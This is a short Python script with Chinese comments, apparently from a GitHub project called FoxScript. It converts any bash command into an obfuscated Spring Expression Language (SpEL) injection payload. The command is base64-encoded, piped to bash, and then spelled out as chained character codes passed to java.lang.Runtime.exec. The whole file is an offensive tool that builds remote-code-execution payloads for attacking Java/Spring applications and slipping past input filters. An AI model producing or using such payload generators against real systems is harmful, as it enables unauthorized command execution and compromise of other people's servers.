# 作者：小狐狸FM
# 项目：https://github.com/smallfox233/FoxScript
# 功能：将命令转换为SpEL表达式并输出
import sys
import argparse
import base64
def shell_to_spel(command):
    # 将shell命令转换为SpEL payload
    command = base64.b64encode(command.encode("utf-8"))
    command = command.decode()  # 将bytes转换为string
    command = "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}"  # 转换命令的格式
    message = command
    poc = '{T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
    for ch in message[1:]:
        poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
    poc += ')}'
    return poc
if __name__ == '__main__':
    # 参数获取
    arg = argparse.ArgumentParser(description="功能：将bash命令转换为spel表达式输出")
    arg.add_argument('-c', '--command', help="传入的命令\n")
    args = arg.parse_args()
    if len(sys.argv) == 1:  # 未传入参数时
        arg.print_help()  # 打印帮助信息
        sys.exit()
    command = str(args.command)
    print(shell_to_spel(command))
